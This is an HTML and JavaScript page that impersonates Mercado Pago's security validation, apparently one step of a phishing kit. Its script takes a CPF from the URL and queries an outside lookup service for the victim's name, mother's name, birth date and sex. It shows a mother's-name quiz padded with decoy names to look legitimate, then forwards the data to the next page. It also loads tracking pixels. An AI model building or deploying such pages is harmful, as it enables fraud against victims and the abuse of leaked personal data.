<!DOCTYPE html>
<html lang="pt-BR">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Valida√ß√£o de Dados</title>
      <script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
<script>
  window.tikTokPixelId = "6917a5ff97e4b1e2a6541a7a";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
  document.head.appendChild(a);
</script>
<!-- TikTok Pixel Code Start -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};


  ttq.load('D4BQAE3C77UD6NKP6AK0');
  ttq.page();
}(window, document, 'ttq');
</script>
<!-- TikTok Pixel Code End -->
      <script src="https://cdn.tailwindcss.com"></script>
      <script>
         tailwind.config = {
             theme: {
                 extend: {
                     colors: {
                         'mp-blue': '#009EE3',
                         'mp-dark-blue': '#0074A8',
                         'mp-light-blue': '#E6F7FF'
                     }
                 }
             }
         }
      </script>
      <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         *{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
         body{min-height:100vh;display:flex;flex-direction:column}
         main{flex:1}
         .fade-in{animation:fadeIn 0.5s ease-out}
         @keyframes fadeIn{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}
         .progress-bar{transition:width 0.3s ease}
         
         /* Ajustes para garantir que o bot√£o seja vis√≠vel */
         .show-button {
             display: block !important;
             visibility: visible !important;
             opacity: 1 !important;
             height: auto !important;
             width: 100% !important;
         }
      </style>
   </head>
   <body class="bg-gray-50">
      <header class="bg-[#FFE600] border-b border-[#E6CF00] shadow-sm">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div class="flex justify-between items-center h-20">
            <div class="flex items-center">
                <img src="logo.png" alt="Mercado Pago" class="h-12 md:h-14">
            </div>
            <div class="flex items-center gap-4">
                <a href="#" class="text-sm font-medium text-gray-900 hover:text-gray-700 transition-colors hidden sm:block">
                    Ajuda
                </a>
            </div>
        </div>
    </div>
</header>

      <main class="py-8 px-4 md:py-12">
         <div class="max-w-xl mx-auto">
            <div class="mb-6">
               <div class="flex items-center justify-between mb-2">
                  <span class="text-sm font-medium text-gray-600">Etapa 2 de 5</span>
                  <span class="text-sm font-medium text-mp-blue">40%</span>
               </div>
               <div class="w-full bg-gray-200 rounded-full h-2">
                  <div class="progress-bar bg-mp-blue h-2 rounded-full" style="width: 40%"></div>
               </div>
            </div>
            <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in">
               <div id="loading" class="text-center hidden">
                  <div class="animate-spin rounded-full h-16 w-16 border-b-2 border-mp-blue mx-auto mb-4"></div>
                  <h2 class="text-xl font-bold text-gray-900 mb-2">Consultando dados...</h2>
                  <p class="text-gray-600">Aguarde enquanto validamos suas informa√ß√µes</p>
               </div>
               <div id="error" class="hidden">
                  <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                     <div class="flex">
                        <svg class="h-5 w-5 text-red-400" viewBox="0 0 20 20" fill="currentColor">
                           <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/>
                        </svg>
                        <div class="ml-3">
                           <p class="text-sm text-red-700" id="errorMessage"></p>
                        </div>
                     </div>
                  </div>
                  <button onclick="location.reload()" class="w-full bg-mp-blue text-white py-3 rounded-lg font-semibold hover:bg-mp-dark-blue transition-all">
                  Tentar novamente
                  </button>
               </div>
               <div id="validation-form">
                  <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Valida√ß√£o de seguran√ßa</h1>
                  <p class="text-gray-600 mb-8">Para sua prote√ß√£o, confirme algumas informa√ß√µes</p>
                  <div class="space-y-6">
                     <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">Qual o primeiro nome da sua m√£e?</label>
                        <div id="mother-options" class="space-y-3"></div>
                     </div>
                     <div id="birthdate-section" class="hidden">
                        <label class="block text-sm font-medium text-gray-700 mb-2">Confirme sua data de nascimento</label>
                        <div class="bg-mp-light-blue border border-mp-blue/30 rounded-xl p-4 text-center mb-4">
                           <p class="text-sm text-gray-600 mb-2">Data de nascimento informada:</p>
                           <p class="text-2xl font-bold text-mp-blue" id="birthdate-display"></p>
                        </div>
                        <div class="grid grid-cols-2 gap-3">
                           <button onclick="validateBirthdate(true)" class="bg-green-50 border-2 border-green-500 text-green-700 py-3 rounded-lg font-semibold hover:bg-green-100 transition-all flex items-center justify-center gap-2">
                              <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                                 <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
                              </svg>
                              Est√° correto
                           </button>
                           <button onclick="validateBirthdate(false)" class="bg-red-50 border-2 border-red-500 text-red-700 py-3 rounded-lg font-semibold hover:bg-red-100 transition-all flex items-center justify-center gap-2">
                              <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                                 <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"/>
                              </svg>
                              Est√° incorreto
                           </button>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </main>


<footer class="bg-[#FFE600] border-t border-[#E6CF00] mt-auto">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div class="flex flex-col items-center justify-center text-center space-y-4">
            <img src="logo.png" alt="Mercado Pago" class="h-10 md:h-12">

            <div class="text-sm text-gray-900 space-y-1">
                <p>¬© <?php echo date('Y'); ?> Mercado Pago - Institui√ß√£o de Pagamento</p>
                <p>CNPJ: 10.573.521/0001-91</p>
                <p>Osasco, SP - CEP 06233-903</p>
            </div>

            <div class="flex flex-wrap justify-center gap-4 text-xs text-gray-700">
                <a href="#" class="hover:text-gray-900 transition-colors font-medium">Termos e condi√ß√µes</a>
                <span class="text-gray-500">|</span>
                <a href="#" class="hover:text-gray-900 transition-colors font-medium">Pol√≠tica de privacidade</a>
                <span class="text-gray-500">|</span>
                <a href="#" class="hover:text-gray-900 transition-colors font-medium">Cookies</a>
            </div>
        </div>
    </div>
</footer>

<script>
   let cpfData = null;
   
   // === utils para normalizar/validar nome ===
const normalize = s => (s || "")
  .toLowerCase()
  .normalize("NFD")
  .replace(/\p{Diacritic}/gu, "")
  .trim();

const hasValue = s =>
  normalize(s).length >= 3 &&
  !/nao informado|n√£o informado|desconhecid/.test(normalize(s));

// pool de nomes rand√¥micos (edite √† vontade)
const RANDOM_MOTHER_NAMES = [
  "Maria", "Ana", "Joana", "Rosa", "Lucia",
  "Carla", "Patr√≠cia", "Beatriz", "Fernanda", "S√¥nia"
];


   async function consultarCPF() {
      const urlParams = new URLSearchParams(window.location.search);
      const cpf = urlParams.get('cpf');
      if (!cpf) { showError('CPF n√£o informado'); return; }

      const cpfLimpo = cpf.replace(/\D/g, '');

      try {
         document.getElementById('validation-form').classList.add('hidden');
         document.getElementById('loading').classList.remove('hidden');

         // === üîÑ CONSULTA ATUALIZADA PARA consultar.php ===
        const response = await fetch(`https://searchapi.dnnl.live/consulta?token_api=7002&cpf=${cpfLimpo}`);
         if (!response.ok) throw new Error('Erro ao consultar CPF');
         const data = await response.json();

        // ‚Äî‚Äî‚Äî Adapta√ß√£o para estrutura MagmaDataHub ‚Äî‚Äî‚Äî
if (!data || data.erro || !hasValue(data.nome_mae)) {
  // N√ÉO temos nome da m√£e real -> N√ÉO inventa ‚Äúcorreto‚Äù.
  cpfData = {
    dados: [{
      NOME_MAE: "", // mant√©m vazio para sabermos que n√£o veio
      NASC: data?.nascimento || "00/00/0000",
      NOME: data?.nome || "Usu√°rio",
      SEXO: data?.sexo || "",
      CPF: data?.cpf || cpfLimpo
    }],
    meta: { hasMae: false }
  };
} else {
  // Temos nome da m√£e real
  cpfData = {
    dados: [{
      NOME_MAE: data.nome_mae,
      NASC: data.nascimento,
      NOME: data.nome,
      SEXO: data.sexo,
      CPF: data.cpf
    }],
    meta: { hasMae: true }
  };
}


         document.getElementById('loading').classList.add('hidden');
         document.getElementById('validation-form').classList.remove('hidden');
         showMotherNameOptions();

      } catch (e) {
         console.error(e);
         showError('N√£o foi poss√≠vel validar seus dados. Tente novamente.');
      }
   }

   function showMotherNameOptions() {
  const hasMae = !!(cpfData?.meta?.hasMae && hasValue(cpfData.dados[0].NOME_MAE));
  const container = document.getElementById("mother-options");
  container.innerHTML = "";

  // gera lista de op√ß√µes
  let options = [];
  if (hasMae) {
    const correctFirst = (cpfData.dados[0].NOME_MAE || "").split(/\s+/)[0] || "";
    const pool = RANDOM_MOTHER_NAMES.filter(n => normalize(n) !== normalize(correctFirst));
    // embaralha
    for (let i = pool.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [pool[i], pool[j]] = [pool[j], pool[i]];
    }
    options = [correctFirst, ...pool.slice(0, 3)];
    // embaralha com o correto dentro
    for (let i = options.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [options[i], options[j]] = [options[j], options[i]];
    }
  } else {
    // sem nome real -> s√≥ rand√¥micos
    const pool = [...RANDOM_MOTHER_NAMES];
    for (let i = pool.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [pool[i], pool[j]] = [pool[j], pool[i]];
    }
    options = pool.slice(0, 4);
  }

  // render dos bot√µes
  options.forEach(name => {
    const button = document.createElement("button");
    button.type = "button";
    button.className =
      "w-full bg-gray-50 border-2 border-gray-200 hover:border-mp-blue text-gray-900 py-3 px-4 rounded-lg font-semibold transition-all text-left";
    button.textContent = name;
    button.onclick = () => validateMotherName(name);
    container.appendChild(button);
  });

  // bot√£o ‚ÄúNenhuma das alternativas‚Äù
  const noneButton = document.createElement("button");
  noneButton.type = "button";
  noneButton.className =
    "w-full bg-mp-blue text-white py-3 rounded-lg font-semibold hover:bg-mp-dark-blue transition-all mt-4";
  noneButton.textContent = "Nenhuma das alternativas";
  noneButton.onclick = function () {
    window.location.href = "/2.2.html" + window.location.search;
  };
  container.appendChild(noneButton);
}


   function validateMotherName(selectedName) {
  const hasMae = !!(cpfData?.meta?.hasMae && hasValue(cpfData.dados[0].NOME_MAE));

  if (hasMae) {
    const correctFirst = (cpfData.dados[0].NOME_MAE || "").split(/\s+/)[0] || "";
    if (normalize(selectedName) !== normalize(correctFirst)) {
      showError("Nome da m√£e incorreto. Por favor, tente novamente.");
      return;
    }
  }
  // quando N√ÉO tem nome real, aceitar qualquer escolha e seguir
  document.getElementById("mother-options").parentElement.classList.add("hidden");
  const birthdateSection = document.getElementById("birthdate-section");
  birthdateSection.classList.remove("hidden");
  document.getElementById("birthdate-display").textContent = cpfData.dados[0].NASC || "00/00/0000";
}


   function validateBirthdate(isCorrect) {
      if (!isCorrect) {
         showError('Data de nascimento incorreta. Entre em contato com o suporte.');
         return;
      }
      const urlParams = new URLSearchParams(window.location.search);
      urlParams.set('nome', cpfData.dados[0].NOME);
      urlParams.set('nasc', cpfData.dados[0].NASC);
      urlParams.set('sexo', cpfData.dados[0].SEXO);
      window.location.href = `2.2.php?${urlParams.toString()}`;
   }

   function showError(message) {
      document.getElementById('loading').classList.add('hidden');
      document.getElementById('validation-form').classList.add('hidden');
      document.getElementById('error').classList.remove('hidden');
      document.getElementById('errorMessage').textContent = message;
   }

   window.onload = consultarCPF;
</script>

      </script>
   </body>
</html>
